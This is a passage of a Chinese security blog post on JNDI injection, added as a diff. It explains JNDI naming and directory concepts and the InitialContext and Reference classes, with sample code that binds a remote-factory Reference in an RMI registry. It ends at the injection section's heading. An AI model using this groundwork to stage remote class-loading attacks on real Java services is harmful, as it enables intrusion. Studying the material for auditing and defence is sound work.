@@ -1,0 +1,1408 @@
+<!DOCTYPE html>
+<html lang="zh-cn">
+  <head>
+    
+    <script type="application/ld+json">
+
+{  
+  "@context":"http://schema.org",
+  "@type":"Website",
+  "@id":"https:\/\/gkjzjh146.github.io\/",
+  "author": {
+    "@type": "Person",
+    "name": "gkjzjh146",
+    
+    "image": "https://gkjzjh146.github.io/images/1.jpg"
+    
+  },
+  "name":"gkjzjh146",
+  "description":"",
+  "url":"https:\/\/gkjzjh146.github.io\/post\/jndi%E6%B3%A8%E5%85%A5%E5%A4%A7%E6%9D%82%E7%83%A9\/",
+  "keywords":"[jndi注入]"
+}
+
+</script>
+    <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="generator" content="Hugo 0.115.4 with theme Tranquilpeak 0.5.3-BETA">
+<meta name="author" content="gkjzjh146">
+<meta name="keywords" content="jndi注入">
+<meta name="description" content="">
+
+
+<meta property="og:description" content="">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Jndi注入大杂烩">
+<meta name="twitter:title" content="Jndi注入大杂烩">
+<meta property="og:url" content="https://gkjzjh146.github.io/post/jndi%E6%B3%A8%E5%85%A5%E5%A4%A7%E6%9D%82%E7%83%A9/">
+<meta property="twitter:url" content="https://gkjzjh146.github.io/post/jndi%E6%B3%A8%E5%85%A5%E5%A4%A7%E6%9D%82%E7%83%A9/">
+<meta property="og:site_name" content="gkjzjh146">
+<meta property="og:description" content="">
+<meta name="twitter:description" content="">
+<meta property="og:locale" content="zh-cn">
+
+  
+    <meta property="article:published_time" content="2023-08-23T08:13:27">
+  
+  
+    <meta property="article:modified_time" content="2023-08-23T08:13:27">
+  
+  
+  
+    
+      <meta property="article:section" content="代码审计">
+    
+  
+  
+    
+      <meta property="article:tag" content="java">
+    
+      <meta property="article:tag" content="代码审计">
+    
+  
+
+
+<meta name="twitter:card" content="summary">
+
+
+
+
+
+
+
+  <meta property="og:image" content="https://gkjzjh146.github.io/images/1.jpg">
+  <meta property="twitter:image" content="https://gkjzjh146.github.io/images/1.jpg">
+
+
+
+
+  <meta property="og:image" content="https://gkjzjh146.github.io/12.jpeg">
+  <meta property="twitter:image" content="https://gkjzjh146.github.io/12.jpeg">
+
+
+  <meta property="og:image" content="https://gkjzjh146.github.io/11.jpeg">
+  <meta property="twitter:image" content="https://gkjzjh146.github.io/11.jpeg">
+
+
+    <title>Jndi注入大杂烩</title>
+
+    <link rel="icon" href="https://gkjzjh146.github.io/images/1.jpg">
+    
+
+    
+
+    <link rel="canonical" href="https://gkjzjh146.github.io/post/jndi%E6%B3%A8%E5%85%A5%E5%A4%A7%E6%9D%82%E7%83%A9/">
+    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <meta name="referrer" content="no-referrer-when-downgrade">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" integrity="sha512-iBBXm8fW90+nuLcSKlbmrPcLa0OT92xO1BIsZ+ywDWZCvqsWgccV3gFoRBv0z+8dLJgyAHIhR35VZc2oM/gI1w==" crossorigin="anonymous" referrerpolicy="no-referrer" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.5.7/jquery.fancybox.min.css" integrity="sha512-H9jrZiiopUdsLpg94A333EfumgUBpO9MdbxStdeITo+KEIMaNfHNvwyjjDJb+ERPaRS6DpyRlKbvPUasNItRyw==" crossorigin="anonymous" referrerpolicy="no-referrer" />
+    
+    
+    
+    <link rel="stylesheet" href="https://gkjzjh146.github.io/css/style-h6ccsoet3mzkbb0wngshlfbaweimexgqcxj0h5hu4h82olsdzz6wmqdkajm.min.css" />
+    
+    
+
+    
+      
+    
+    
+  </head>
+
+  <body>
+    <div id="blog">
+      <header id="header" data-behavior="4">
+  <i id="btn-open-sidebar" class="fa fa-lg fa-bars"></i>
+  <div class="header-title">
+    <a class="header-title-link" href="https://gkjzjh146.github.io/" aria-label="去首页">gkjzjh146</a>
+  </div>
+  
+    
+      <a class="header-right-picture "
+         href="https://gkjzjh146.github.io/#about" aria-label="打开链接: /#about">
+    
+    
+    
+      
+        <img class="header-picture" src="https://gkjzjh146.github.io/images/1.jpg" alt="作者的图片" />
+      
+    
+    </a>
+  
+</header>
+
+      <nav id="sidebar" data-behavior="4">
+  <div class="sidebar-container">
+    
+      <div class="sidebar-profile">
+        <a href="https://gkjzjh146.github.io/#about" aria-label="阅读有关作者的更多信息">
+          <img class="sidebar-profile-picture" src="https://gkjzjh146.github.io/images/1.jpg" alt="作者的图片" />
+        </a>
+        <h4 class="sidebar-profile-name">gkjzjh146</h4>
+        
+          <h5 class="sidebar-profile-bio">会点web，会点misc</h5>
+        
+      </div>
+    
+    <ul class="sidebar-buttons">
+      
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://gkjzjh146.github.io/" title="Home">
+    
+      <i class="sidebar-button-icon fas fa-lg fa-home" aria-hidden="true"></i>
+      
+      <span class="sidebar-button-desc">首页</span>
+    </a>
+  </li>
+
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://gkjzjh146.github.io/categories" title="Categories">
+    
+      <i class="sidebar-button-icon fas fa-lg fa-bookmark" aria-hidden="true"></i>
+      
+      <span class="sidebar-button-desc">分类</span>
+    </a>
+  </li>
+
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://gkjzjh146.github.io/tags" title="Tags">
+    
+      <i class="sidebar-button-icon fas fa-lg fa-tags" aria-hidden="true"></i>
+      
+      <span class="sidebar-button-desc">标签</span>
+    </a>
+  </li>
+
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://gkjzjh146.github.io/archives" title="Archives">
+    
+      <i class="sidebar-button-icon fas fa-lg fa-archive" aria-hidden="true"></i>
+      
+      <span class="sidebar-button-desc">归档</span>
+    </a>
+  </li>
+
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://gkjzjh146.github.io/#about" title="About">
+    
+      <i class="sidebar-button-icon fas fa-lg fa-question" aria-hidden="true"></i>
+      
+      <span class="sidebar-button-desc">关于</span>
+    </a>
+  </li>
+
+
+    </ul>
+    <ul class="sidebar-buttons">
+      
+
+    </ul>
+    <ul class="sidebar-buttons">
+      
+
+    </ul>
+  </div>
+</nav>
+
+      
+  <div class="post-header-cover
+              text-center
+              "
+       style="background-image:url('/12.jpeg')"
+       data-behavior="4">
+    
+      <div class="post-header main-content-wrap text-center">
+  
+    <h1 class="post-title">
+      Jndi注入大杂烩
+    </h1>
+  
+  
+  <div class="postShorten-meta post-meta">
+    
+      <time datetime="2023-08-23T08:13:27&#43;08:00">
+        
+  八月 23, 2023
+
+      </time>
+    
+    
+  
+  
+    <span>发布在</span>
+    
+      <a class="category-link" href="https://gkjzjh146.github.io/categories/%e4%bb%a3%e7%a0%81%e5%ae%a1%e8%ae%a1">代码审计</a>
+    
+  
+
+  </div>
+
+</div>
+    
+  </div>
+
+
+      <div id="main" data-behavior="4"
+        class="hasCover
+               hasCoverMetaIn
+               ">
+        <article class="post" id="top">
+          
+          
+          <div class="post-content markdown">
+            <div class="main-content-wrap">
+              <h1 id="table-of-contents">目录</h1>
+<nav id="TableOfContents">
+  <ul>
+    <li><a href="#jndi介绍">JNDI介绍</a>
+      <ul>
+        <li><a href="#naming-service命名服务">Naming Service命名服务</a></li>
+        <li><a href="#directory-service目录服务">Directory Service目录服务</a></li>
+        <li><a href="#api">API</a></li>
+      </ul>
+    </li>
+    <li><a href="#jndi的结构">JNDI的结构</a>
+      <ul>
+        <li><a href="#类介绍">类介绍</a>
+          <ul>
+            <li><a href="#initialcontext类">InitialContext类</a></li>
+            <li><a href="#reference类">Reference类</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#jndi-references-注入">JNDI References 注入</a></li>
+    <li><a href="#jndi-rmi">JNDI RMI</a>
+      <ul>
+        <li><a href="#低版本jdk运行">低版本jdk运行</a></li>
+        <li><a href="#高版本jdk运行">高版本jdk运行</a>
+          <ul>
+            <li><a href="#异常分析">异常分析</a></li>
+            <li><a href="#绕过">绕过</a></li>
+            <li><a href="#环境搭建">环境搭建</a></li>
+            <li><a href="#bypass分析">bypass分析</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#jndi_ldap">JNDI_LDAP</a>
+      <ul>
+        <li><a href="#低版本运行">低版本运行</a></li>
+        <li><a href="#搭建环境">搭建环境</a></li>
+        <li><a href="#流程分析">流程分析</a></li>
+        <li><a href="#高版本运行">高版本运行</a></li>
+        <li><a href="#使用序列化数据触发gadget">使用序列化数据触发Gadget</a></li>
+      </ul>
+    </li>
+    <li><a href="#参考">参考</a></li>
+  </ul>
+</nav>
+
+<h1 id="jndi介绍">JNDI介绍</h1>
+<p>根据官方文档，JNDI 全称为 <strong>Java Naming and Directory Interface</strong>，即 Java 名称与目录接口。</p>
+<h2 id="naming-service命名服务">Naming Service命名服务</h2>
+<p>命名服务将名称和对象进行关联，提供通过名称找到对象的操作，例如：<code>DNS</code>系统将计算机名和<code>IP</code>地址进行关联、文件系统将文件名和文件句柄进行关联等等。
+在一些命名服务系统中，系统并不是直接将对象存储在系统中，而是保持对象的引用。引用包含了如何访问实际对象的信息。</p>
+<p>其中另一个值得一提的名称服务为 <code>LDAP</code>，全称为 <code>Lightweight Directory Access Protocol</code>，即轻量级目录访问协议，其名称也是从右到左进行逐级定义，各级以逗号分隔，每级为一个 <code>name</code>/<code>value</code> 对，以等号分隔。比如一个 <code>LDAP</code> 名称如下:</p>
+<pre tabindex="0"><code>cn=John, o=Sun, c=US
+</code></pre><p>表示在<code>c=US</code>的子域中寻找<code>o=Sun</code>的子域，再在结果中查找<code>cn=John</code>的对象。</p>
+<p>在名称系统中，有几个重要的概念。</p>
+<p><code>Bindings</code>: 表示一个名称和对应对象的绑定关系，比如在文件系统中文件名绑定到对应的文件，在 <code>DNS</code> 中域名绑定到对应的 <code>IP</code>。</p>
+<p><code>Context</code>: 上下文，一个上下文中对应着一组名称到对象的绑定关系，我们可以在指定上下文中查找名称对应的对象。比如在文件系统中，一个目录就是一个上下文，可以在该目录中查找文件，其中子目录也可以称为子上下文 (<code>subcontext</code>)。</p>
+<p><code>References</code>: 在一个实际的名称服务中，有些对象可能无法直接存储在系统内，这时它们便以引用的形式进行存储，可以理解为 <code>C/C++</code> 中的指针。引用中包含了获取实际对象所需的信息，甚至对象的实际状态。比如文件系统中实际根据名称打开的文件是一个整数 <code>fd</code> (<code>file descriptor</code>)，这就是一个引用，内核根据这个引用值去找到磁盘中的对应位置和读写偏移。</p>
+<h2 id="directory-service目录服务">Directory Service目录服务</h2>
+<p>目录服务是命名服务的扩展，除了提供名称和对象的关联，还允许对象具有属性。目录服务中的对象称之为目录对象。目录服务提供创建、添加、删除目录对象以及修改目录对象属性等操作。由此，我们不仅可以根据名称去查找(<code>lookup</code>)对象(并获取其对应属性)，还可以根据属性值去搜索(<code>search</code>)对象。
+一些典型的目录服务有:
+<code>NIS</code>: <code>Network Information Service，Solaris</code> 系统中用于查找系统相关信息的目录服务；
+<code>Active Directory</code>: 为 <code>Windows</code> 域网络设计，包含多个目录服务，比如域名服务、证书服务等；
+其他基于 <code>LDAP</code> 协议实现的目录服务；
+总而言之，目录服务也是一种特殊的名称服务，关键区别是在目录服务中通常使用搜索(<code>search</code>)操作去定位对象，而不是简单的根据名称查找(<code>lookup</code>)去定位。
+在下文中如果没有特殊指明，都会将名称服务与目录服务统称为目录服务。</p>
+<h2 id="api">API</h2>
+<p>根据上面的介绍，我们知道目录服务是中心化网络应用的一个重要组件。使用目录服务可以简化应用中服务管理验证逻辑，集中存储共享信息。在 <code>Java</code> 应用中除了以常规方式使用名称服务(比如使用 <code>DNS</code> 解析域名)，另一个常见的用法是使用目录服务作为对象存储的系统，即用目录服务来存储和获取 <code>Java</code> 对象。
+比如对于打印机服务，我们可以通过在目录服务中查找打印机，并获得一个打印机对象，基于这个 <code>Java</code> 对象进行实际的打印操作。
+为此，就有了 <code>JNDI</code>，即 <code>Java</code> 的名称与目录服务接口，应用通过该接口与具体的目录服务进行交互。从设计上，<code>JNDI</code> 独立于具体的目录服务实现，因此可以针对不同的目录服务提供统一的操作接口。
+<code>JNDI</code> 架构上主要包含两个部分，即 <code>Java</code> 的应用层接口和 <code>SPI</code>，如下图所示:</p>
+<p><img src="https://gkjzjh146.github.io/jndi%E6%B3%A8%E5%85%A5%E5%A4%A7%E6%9D%82%E7%83%A9.assets/image-20230823083527267.png" alt="image-20230823083527267"></p>
+<p><code>SPI</code> 全称为 <code>Service Provider Interface</code>，即服务供应接口，主要作用是为底层的具体目录服务提供统一接口，从而实现目录服务的可插拔式安装。在 <code>JDK</code> 中包含了下述内置的目录服务:
+<code>RMI</code>: <code>Java Remote Method Invocation</code>，<code>Java</code> 远程方法调用；
+<code>LDAP</code>: 轻量级目录访问协议；
+<code>CORBA</code>: <code>Common Object Request Broker Architecture</code>，通用对象请求代理架构，用于 <code>COS</code> 名称服务(<code>Common Object Services</code>)；
+除此之外，用户还可以在 <code>Java</code> 官网下载其他目录服务实现。由于 <code>SPI</code> 的统一接口，厂商也可以提供自己的私有目录服务实现，用户可无需重复修改代码。
+为了更好理解 <code>JNDI</code>，我们需要了解其背后的服务提供者(<code>Service Provider</code>)，这些目录服务本身和 <code>JNDI</code> 有没直接耦合性，但基于 <code>SPI</code> 接口和 <code>JNDI</code> 构建起了重要的联系。</p>
+<h1 id="jndi的结构">JNDI的结构</h1>
+<p>从上面介绍的三个 <code>Service Provider</code> 我们可以看到，除了 <code>RMI</code> 是 <code>Java</code> 特有的远程调用框架，其他两个都是通用的服务和标准，可以脱离 <code>Java</code> 独立使用。<code>JNDI</code> 就是在这个基础上提供了统一的接口，来方便调用各种服务。
+在<code>Java JDK</code>里面提供了5个包，提供给<code>JNDI</code>的功能实现，分别是：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>javax<span style="color:#f92672">.</span><span style="color:#a6e22e">naming</span><span style="color:#960050;background-color:#1e0010">：主要用于命名操作</span><span style="color:#f92672">,</span><span style="color:#960050;background-color:#1e0010">包含了访问目录服务所需的类和接口，比如</span> Context<span style="color:#960050;background-color:#1e0010">、</span>Bindings<span style="color:#960050;background-color:#1e0010">、</span>References<span style="color:#960050;background-color:#1e0010">、</span>lookup <span style="color:#960050;background-color:#1e0010">等。</span>
+</span></span><span style="display:flex;"><span>javax<span style="color:#f92672">.</span><span style="color:#a6e22e">naming</span><span style="color:#f92672">.</span><span style="color:#a6e22e">directory</span><span style="color:#960050;background-color:#1e0010">：主要用于目录操作，它定义了</span>DirContext<span style="color:#960050;background-color:#1e0010">接口和</span>InitialDir<span style="color:#f92672">-</span> Context<span style="color:#960050;background-color:#1e0010">类；</span>
+</span></span><span style="display:flex;"><span>javax<span style="color:#f92672">.</span><span style="color:#a6e22e">naming</span><span style="color:#f92672">.</span><span style="color:#a6e22e">event</span><span style="color:#960050;background-color:#1e0010">：在命名目录服务器中请求事件通知；</span>
+</span></span><span style="display:flex;"><span>javax<span style="color:#f92672">.</span><span style="color:#a6e22e">naming</span><span style="color:#f92672">.</span><span style="color:#a6e22e">ldap</span><span style="color:#960050;background-color:#1e0010">：提供</span>LDAP<span style="color:#960050;background-color:#1e0010">支持；</span>
+</span></span><span style="display:flex;"><span>javax<span style="color:#f92672">.</span><span style="color:#a6e22e">naming</span><span style="color:#f92672">.</span><span style="color:#a6e22e">spi</span><span style="color:#960050;background-color:#1e0010">：允许动态插入不同实现，为不同命名目录服务供应商的开发人员提供开发和实现的途径，以便应用程序通过</span>JNDI<span style="color:#960050;background-color:#1e0010">可以访问相关服务。</span>
+</span></span></code></pre></div><h2 id="类介绍">类介绍</h2>
+<h3 id="initialcontext类">InitialContext类</h3>
+<p>构造方法</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#75715e">//构建一个初始上下文。
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>InitialContext<span style="color:#f92672">()</span> 
+</span></span><span style="display:flex;"><span><span style="color:#75715e">//构造一个初始上下文，并选择不初始化它。
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>InitialContext<span style="color:#f92672">(</span><span style="color:#66d9ef">boolean</span> lazy<span style="color:#f92672">)</span> 
+</span></span><span style="display:flex;"><span><span style="color:#75715e">//使用提供的环境构建初始上下文。
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>InitialContext<span style="color:#f92672">(</span>Hashtable<span style="color:#f92672">&lt;?,?&gt;</span> environment<span style="color:#f92672">)</span> 
+</span></span></code></pre></div><p>常用方法</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#75715e">//将名称绑定到对象。 
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>bind<span style="color:#f92672">(</span>Name name<span style="color:#f92672">,</span> Object obj<span style="color:#f92672">)</span> 
+</span></span><span style="display:flex;"><span><span style="color:#75715e">//枚举在命名上下文中绑定的名称以及绑定到它们的对象的类名。
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>list<span style="color:#f92672">(</span>String name<span style="color:#f92672">)</span> 
+</span></span><span style="display:flex;"><span><span style="color:#75715e">//检索命名对象。
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>lookup<span style="color:#f92672">(</span>String name<span style="color:#f92672">)</span>  
+</span></span><span style="display:flex;"><span><span style="color:#75715e">//将名称绑定到对象，覆盖任何现有绑定。
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>rebind<span style="color:#f92672">(</span>String name<span style="color:#f92672">,</span> Object obj<span style="color:#f92672">)</span> 
+</span></span><span style="display:flex;"><span><span style="color:#75715e">//取消绑定命名对象。
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>unbind<span style="color:#f92672">(</span>String name<span style="color:#f92672">)</span>  
+</span></span></code></pre></div><p>例子</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#f92672">import</span> javax.naming.InitialContext<span style="color:#f92672">;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> javax.naming.NamingException<span style="color:#f92672">;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">jndi</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">main</span><span style="color:#f92672">(</span>String<span style="color:#f92672">[]</span> args<span style="color:#f92672">)</span> <span style="color:#66d9ef">throws</span> NamingException <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>        String uri <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;rmi://127.0.0.1:1099/work&#34;</span><span style="color:#f92672">;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">//在这JDK里面给的解释是构建初始上下文，其实通俗点来讲就是获取初始目录环境。
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        InitialContext initialContext <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> InitialContext<span style="color:#f92672">();</span>
+</span></span><span style="display:flex;"><span>        initialContext<span style="color:#f92672">.</span><span style="color:#a6e22e">lookup</span><span style="color:#f92672">(</span>uri<span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span>
+</span></span></code></pre></div><p>总的来说，这个例子的作用就是查找与该地址关联的jndi对象。如果运行成功，它将打印出相关对象的信息。如果连接被拒绝或者找不到对应的对象，可能会抛出<code>NamingException</code>异常</p>
+<h3 id="reference类">Reference类</h3>
+<p>该类也是在<code>javax.naming</code>的一个类，该类表示对在命名/目录系统外部找到的对象的引用。提供了JNDI中类的引用功能。</p>
+<p>构造方法</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#75715e">//为类名为“className”的对象构造一个新的引用。
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>Reference<span style="color:#f92672">(</span>String className<span style="color:#f92672">)</span> 
+</span></span><span style="display:flex;"><span><span style="color:#75715e">//为类名为“className”的对象和地址构造一个新引用。 
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>Reference<span style="color:#f92672">(</span>String className<span style="color:#f92672">,</span> RefAddr addr<span style="color:#f92672">)</span> 
+</span></span><span style="display:flex;"><span><span style="color:#75715e">//为类名为“className”的对象，对象工厂的类名和位置以及对象的地址构造一个新引用。 
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>Reference<span style="color:#f92672">(</span>String className<span style="color:#f92672">,</span> RefAddr addr<span style="color:#f92672">,</span> String factory<span style="color:#f92672">,</span> String factoryLocation<span style="color:#f92672">)</span> 
+</span></span><span style="display:flex;"><span><span style="color:#75715e">//为类名为“className”的对象以及对象工厂的类名和位置构造一个新引用。  
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>Reference<span style="color:#f92672">(</span>String className<span style="color:#f92672">,</span> String factory<span style="color:#f92672">,</span> String factoryLocation<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">/*
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">参数：
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">className 远程加载时所使用的类名
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">factory  加载的class中需要实例化类的名称
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">factoryLocation  提供classes数据的地址可以是file/ftp/http协议
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">*/</span>
+</span></span></code></pre></div><p>常用方法：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#75715e">//将地址添加到索引posn的地址列表中。
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">add</span><span style="color:#f92672">(</span><span style="color:#66d9ef">int</span> posn<span style="color:#f92672">,</span> RefAddr addr<span style="color:#f92672">)</span> 
+</span></span><span style="display:flex;"><span><span style="color:#75715e">//将地址添加到地址列表的末尾。 
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">add</span><span style="color:#f92672">(</span>RefAddr addr<span style="color:#f92672">)</span> 
+</span></span><span style="display:flex;"><span><span style="color:#75715e">//从此引用中删除所有地址。  
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">clear</span><span style="color:#f92672">()</span> 
+</span></span><span style="display:flex;"><span><span style="color:#75715e">//检索索引posn上的地址。 
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>RefAddr <span style="color:#a6e22e">get</span><span style="color:#f92672">(</span><span style="color:#66d9ef">int</span> posn<span style="color:#f92672">)</span> 
+</span></span><span style="display:flex;"><span><span style="color:#75715e">//检索地址类型为“addrType”的第一个地址。  
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>RefAddr <span style="color:#a6e22e">get</span><span style="color:#f92672">(</span>String addrType<span style="color:#f92672">)</span> 
+</span></span><span style="display:flex;"><span><span style="color:#75715e">//检索本参考文献中地址的列举。 
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>Enumeration<span style="color:#f92672">&lt;</span>RefAddr<span style="color:#f92672">&gt;</span> <span style="color:#a6e22e">getAll</span><span style="color:#f92672">()</span> 
+</span></span><span style="display:flex;"><span><span style="color:#75715e">//检索引用引用的对象的类名。 
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>String <span style="color:#a6e22e">getClassName</span><span style="color:#f92672">()</span> 
+</span></span><span style="display:flex;"><span><span style="color:#75715e">//检索此引用引用的对象的工厂位置。  
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>String <span style="color:#a6e22e">getFactoryClassLocation</span><span style="color:#f92672">()</span> 
+</span></span><span style="display:flex;"><span><span style="color:#75715e">//检索此引用引用对象的工厂的类名。  
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>String <span style="color:#a6e22e">getFactoryClassName</span><span style="color:#f92672">()</span> 
+</span></span><span style="display:flex;"><span><span style="color:#75715e">//从地址列表中删除索引posn上的地址。    
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>Object <span style="color:#a6e22e">remove</span><span style="color:#f92672">(</span><span style="color:#66d9ef">int</span> posn<span style="color:#f92672">)</span> 
+</span></span><span style="display:flex;"><span><span style="color:#75715e">//检索此引用中的地址数。 
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">size</span><span style="color:#f92672">()</span> 
+</span></span><span style="display:flex;"><span><span style="color:#75715e">//生成此引用的字符串表示形式。
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>String <span style="color:#a6e22e">toString</span><span style="color:#f92672">()</span> 
+</span></span></code></pre></div><p>例子</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#f92672">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper<span style="color:#f92672">;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> javax.naming.NamingException<span style="color:#f92672">;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> javax.naming.Reference<span style="color:#f92672">;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.rmi.AlreadyBoundException<span style="color:#f92672">;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.rmi.RemoteException<span style="color:#f92672">;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.rmi.registry.LocateRegistry<span style="color:#f92672">;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.rmi.registry.Registry<span style="color:#f92672">;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">jndi</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">main</span><span style="color:#f92672">(</span>String<span style="color:#f92672">[]</span> args<span style="color:#f92672">)</span> <span style="color:#66d9ef">throws</span> NamingException<span style="color:#f92672">,</span> RemoteException<span style="color:#f92672">,</span> AlreadyBoundException <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>        String url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;http://127.0.0.1:8080&#34;</span><span style="color:#f92672">;</span> 
+</span></span><span style="display:flex;"><span>        Registry registry <span style="color:#f92672">=</span> LocateRegistry<span style="color:#f92672">.</span><span style="color:#a6e22e">createRegistry</span><span style="color:#f92672">(</span><span style="color:#ae81ff">1099</span><span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>        Reference reference <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> Reference<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;test&#34;</span><span style="color:#f92672">,</span> <span style="color:#e6db74">&#34;test&#34;</span><span style="color:#f92672">,</span> url<span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>        ReferenceWrapper referenceWrapper <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ReferenceWrapper<span style="color:#f92672">(</span>reference<span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>        registry<span style="color:#f92672">.</span><span style="color:#a6e22e">bind</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;aa&#34;</span><span style="color:#f92672">,</span>referenceWrapper<span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span>
+</span></span></code></pre></div><p>上面代码的功能是将一个包含特定信息的<code>Reference</code>对象通过<code>JNDI</code>和<code>RMI</code>机制绑定到RMI注册表中。</p>
+<p>这里可以看到调用完<code>Reference</code>后调用了<code>ReferenceWrapper</code>将前面的<code>Reference</code>对象给传进去。将类注册到<code>Registry</code>需要实现<code>Remote</code>和继承<code>UnicastRemoteobject</code>类。这里并没有看到相关的代码，所以这里还需要调用<code>ReferenceWrapper</code>将他封装一下</p>
+<h1 id="jndi-references-注入">JNDI References 注入</h1>
